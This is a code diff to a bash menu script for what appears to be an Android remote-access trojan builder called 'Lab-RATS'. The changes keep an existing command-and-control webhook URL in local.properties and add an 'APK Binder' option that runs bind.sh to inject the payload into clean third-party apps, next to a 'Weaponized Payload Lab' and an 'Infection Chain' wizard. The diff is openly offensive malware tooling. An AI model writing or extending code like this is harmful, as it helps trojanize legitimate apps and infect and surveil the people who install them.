@@ -192,11 +192,23 @@ configure_app() {
     echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
     echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"
 
-    read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
-    if [ -n "$WEB_URL" ]; then
+    EXISTING_WEBHOOK=""
+    if [ -f "$PROJECT_DIR/local.properties" ]; then
+        EXISTING_WEBHOOK=$(grep "WEBHOOK_URL=" "$PROJECT_DIR/local.properties" | cut -d'=' -f2-)
+    fi
+
+    if [ -n "$EXISTING_WEBHOOK" ]; then
+        echo -e "${YELLOW}    Current Webhook URL: $EXISTING_WEBHOOK${NC}"
+        read -p "    Enter C2 Webhook URL [Press Enter to Keep Current]: " WEB_URL
+        WEB_URL=${WEB_URL:-$EXISTING_WEBHOOK}
+    else
+        read -p "    Enter C2 Webhook URL (Google Script or Render): " WEB_URL
+    fi
+
+    if grep -q "WEBHOOK_URL=" "$PROJECT_DIR/local.properties"; then
         sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
-        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
+        echo "WEBHOOK_URL=$WEB_URL" >> "$PROJECT_DIR/local.properties"
     fi
 
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
@@ -419,8 +431,9 @@ main_menu() {
     echo "    4. Check Requirements"
     echo "    5. Weaponized Payload Lab"
     echo "    6. Generate Infection Chain Package (Wizard)"
-    echo "    7. Help / Documentation"
-    echo "    8. Exit"
+    echo "    7. Smali Surgery & APK Binder (Infect Clean APK)"
+    echo "    8. Help / Documentation"
+    echo "    9. Exit"
     echo ""
     read -p "    Choose option (Default 1): " MENU_OPTION
     MENU_OPTION=${MENU_OPTION:-1}
@@ -431,8 +444,9 @@ main_menu() {
         4) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
         5) exploit_menu ;;
         6) infection_wizard ;;
-        7) show_help ;;
-        8) exit 0 ;;
+        7) "$SCRIPT_DIR/bind.sh"; read -p "    Press Enter to return..." ;;
+        8) show_help ;;
+        9) exit 0 ;;
     esac
 }
 show_help() {
@@ -445,6 +459,7 @@ show_help() {
     echo "4. Requirements: Check Java setup."
     echo "5. Exploit Lab: Generate standalone tactical vectors."
     echo "6. Infection Wizard: Full Build -> Host -> Weaponize."
+    echo "7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK."
     echo "------------------------------------------------------------"
     read -p "Press Enter..."
 }
